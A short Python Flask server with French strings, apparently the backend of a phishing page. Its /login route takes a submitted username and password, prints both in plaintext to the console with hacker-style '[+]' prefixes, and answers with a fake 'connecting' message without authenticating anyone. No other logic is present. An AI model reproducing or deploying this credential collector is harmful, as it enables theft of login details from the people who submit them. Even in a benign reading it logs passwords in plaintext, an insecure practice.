from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "<h1>Bienvenue sur mon serveur Flask !</h1>"

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    print(f"[+] Nom d'utilisateur reçu : {username}")
    print(f"[+] Mot de passe reçu : {password}")

    return "<h1>Connexion en cours...</h1>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)


